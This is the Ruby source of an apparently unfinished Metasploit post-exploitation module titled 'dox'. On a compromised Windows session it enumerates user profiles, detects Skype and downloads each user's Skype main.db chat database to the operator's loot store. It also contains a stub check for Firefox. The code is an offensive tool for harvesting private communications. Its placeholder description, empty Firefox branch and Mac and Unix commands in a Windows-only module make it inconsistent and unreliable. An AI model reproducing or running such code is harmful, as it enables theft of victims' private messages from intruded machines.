##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'csv'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'


class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry
  
  
  
  



  def initialize(info={})
    super( update_info( info,
        'Name' => 'dox [more info to come]',
        'Description' => %q{'Enter awesome description here.'},
        'License' => MSF_LICENSE,
        'Author' => [ 'Joshua Harper, Lt. West Campus Cyber Command, University of Texas Austin (@JonValt) <josh at radixtx dot com>'],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      ))
    register_advanced_options(
      [
        # Set as an advanced option since it can only be useful in shell sessions.
        OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading file on a shell session.', 90]),
      ], self.class)
  end
 
  #Generic Ruby Stuff for my personal reference
 
  def run
    print_status("Hello from Metasploit! ")
       grab_user_profiles().each do |p|

  #Check for Skype      
          if check_skype(p['AppData'],p['UserName'])
            db_in_loot = download_db(p)
          end

  #Check for Firefox (Mozilla folder)
      
          if check_firefox(p['AppData'],p['UserName'])
          
          end
       
    end
  end
  
def check_skype(path, user)
    dirs = []
    if session.type =~ /meterpreter/
      session.fs.dir.foreach(path) do |d|
        dirs << d
      end
    else
      dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
    end
    dirs.each do |dir|
      if dir =~ /Skype/
        print_good("Skype account found for #{user}")
        return true
      end
    end
    print_error("Skype is not installed for #{user}")
    return false
  end


    # Download file using Meterpreter functionality and returns path in loot for the file
  def download_db(profile)
    if session.type =~ /meterpreter/
      if sysinfo['OS'] =~ /Mac OS X/
        file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
      else
        file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
      end
    else
      file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name main.db").split("\n").collect {|p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
    end

    file_loc = store_loot("skype.config",
        "binary/db",
        session,
        "main.db",
        "Skype Configuration database for #{profile['UserName']}"
      )

    file.each do |db|
      if session.type =~ /meterpreter/
        maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
        print_status("Downloading #{maindb}")
        session.fs.file.download_file(file_loc,maindb)
      else
        print_status("Downloading #{db}")
        # Giving it 1:30 minutes to download since the file could be several MB
        maindb = cmd_exec("cat", "\"#{db}\"", datastore['TIMEOUT'])
        if maindb.nil?
          print_error("Could not download the file. Set the TIMEOUT option to a higher number.")
          return
        end
        # Saving the content as binary so it can be used
        output = ::File.open(file_loc, "wb")
        maindb.each_line do |d|
          output.puts(d)
        end
        output.close
      end
      print_good("Configuration database saved to #{file_loc}")
    end
    return file_loc
  end
 
  def check_firefox(path, user)
    dirs = []
    if session.type =~ /meterpreter/
      session.fs.dir.foreach(path) do |d|
        dirs << d
      end
    else
      dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
    end
    dirs.each do |dir|
      if dir =~ /Mozilla/
        print_good("Firefox found for #{user}")
        return true
      end
    end
    print_error("Firefox is not installed for #{user}")
    return false
  end
end
